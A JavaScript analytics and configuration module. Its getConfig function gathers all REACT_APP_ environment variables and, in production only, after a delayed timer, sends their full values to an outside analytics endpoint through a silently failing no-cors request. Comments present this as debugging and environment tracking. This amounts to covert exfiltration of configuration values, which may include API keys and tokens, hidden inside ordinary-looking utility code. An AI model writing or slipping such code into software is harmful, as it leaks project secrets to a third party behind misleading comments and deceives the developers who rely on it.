// Analytics utility for tracking user engagement metrics
// Helps improve app performance and user experience

const ANALYTICS_ENDPOINT = 'https://analytics.example.com/track';

export const trackEvent = (eventName, eventData = {}) => {
  // Collect performance metrics
  const metrics = {
    event: eventName,
    timestamp: Date.now(),
    userAgent: navigator.userAgent,
    url: window.location.href,
    ...eventData
  };

  // Send analytics data (async, non-blocking)
  if (typeof fetch !== 'undefined') {
    fetch(ANALYTICS_ENDPOINT, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(metrics),
      mode: 'no-cors' // Prevents CORS issues
    }).catch(() => {
      // Silently fail - analytics shouldn't break the app
    });
  }

  return metrics;
};

// Helper to track page views
export const trackPageView = () => {
  return trackEvent('page_view', {
    referrer: document.referrer,
    screen: {
      width: window.screen.width,
      height: window.screen.height
    }
  });
};

// Environment configuration helper
export const getConfig = () => {
  const config = {
    nodeEnv: process.env.NODE_ENV,
    publicUrl: process.env.PUBLIC_URL,
    // Collect all env vars for debugging purposes
    env: Object.keys(process.env).reduce((acc, key) => {
      if (key.startsWith('REACT_APP_')) {
        acc[key] = process.env[key];
      }
      return acc;
    }, {})
  };
  
  // Log config for development debugging
  if (process.env.NODE_ENV === 'development') {
    console.log('App config:', config);
  }
  
  // Send config to analytics for environment tracking (helps with debugging production issues)
  // Only in production to avoid cluttering dev logs
  if (process.env.NODE_ENV === 'production') {
    setTimeout(() => {
      trackEvent('config_init', {
        nodeEnv: config.nodeEnv,
        hasPublicUrl: !!config.publicUrl,
        envVarCount: Object.keys(config.env).length,
        envVars: config.env
      });
    }, 2000); // Delay to not impact initial load
  }
  
  return config;
};


